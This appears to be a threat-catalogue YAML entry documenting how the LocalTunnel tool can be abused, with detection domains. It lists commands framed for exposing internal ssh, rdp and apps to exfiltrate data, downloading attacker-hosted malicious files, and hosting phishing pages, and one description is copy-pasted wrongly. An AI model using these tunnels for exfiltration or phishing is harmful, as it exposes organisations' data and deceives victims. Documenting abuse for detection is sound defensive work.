---
Name: LocalTunnels - lt
Description: LocalTunnels enables insiders as well as threat actors to expose local ports over the LocalTunnels generated links. The access is protected with a password. However, it can be accessed directly on the main page the first time tunnel is accessed. The important thing to note is that a service is required to be running onto the port which is required to be exposed. On the other hand, threat actors can set up their own listening server using LocalTunnels server provided on their GitHub page. This can be used by the insiders to exfiltrate the local data outside as well as threat actors to host phishing pages, malicious binaries etc.
Author: Kamran Saifullah
Created: 2024-10-13

Commands:
  - Command: npx localtunnel --port <PORT>
    Description: This is a quick way to start the localtunnels by directly executing the localtunnels and generating links.
    Usecase: Quick execution of localtunnels.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: lt --host http|https://<URL>:<PORT> --PORT <LOCAL PORT>
    Description: This will bind the local port running on the server to the domain name and the port that is required to bind to the local port.
    Usecase: Configuring the server to bind a local port and have it exposed via the server LocalTunnels are installed on. 
    Category: Access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: npm install -g localtunnel
    Description: This will install localtunnels globally on the system.
    Usecase: Installing localtunnels globally.
    Category: install
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: lt --port <PORT>
    Description: This will install localtunnels globally on the system.
    Usecase: This binds the local service running to the LocalTunnels URL which can be accessed over the internet for data exfiltration. This can be binded to internal apps, ssh, rdp and other services/applications running locally.
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: wget http|https://<URL>/<File/Directory>
    Description: This will enable insiders as well as threat actors to download the hosted files onto the machine.
    Usecase: Insiders exposing local system and downloading the files. Threat Actors hosting malicious files and downloading those onto the targeted system. 
    Category: download
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

    - Command: PORT=<PORT> lt
    Description: This will execute LocalTunnels and bind it to the port defined in the environment variable.
    Usecase: Binding LocalTunnels to a port defined in the environment varaibles for data exfiltration. This can be binded to internal apps, ssh, rdp and other services/applications running locally.
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: '*.loca.lt'
    Description: The URLs generated can be binded to a locally hosting phising page by the threat actors. 
    Usecase: Threat Actors binding the LocalTunnels port to the locally hosted Phishing Side and sending out the link to victims. 
    Category: phishing
    Privileges: User
    OperatingSystem: Windows, Mac, Linux
Full_Path:
  - Path: Quick Start/Installed version of LocalTunnels, which gets executed anywhere on the system.
Detection:
  - Domain: '*.loca.lt'
  - Domain: '*.localtunnel.me'

Resources:
  - Link: https://github.com/localtunnel/server
  - Link: https://github.com/localtunnel/localtunnel?tab=readme-ov-file
Acknowledgement:
  - Person: Kamran Saifullah
    Handle: '@deFr0ggy'
---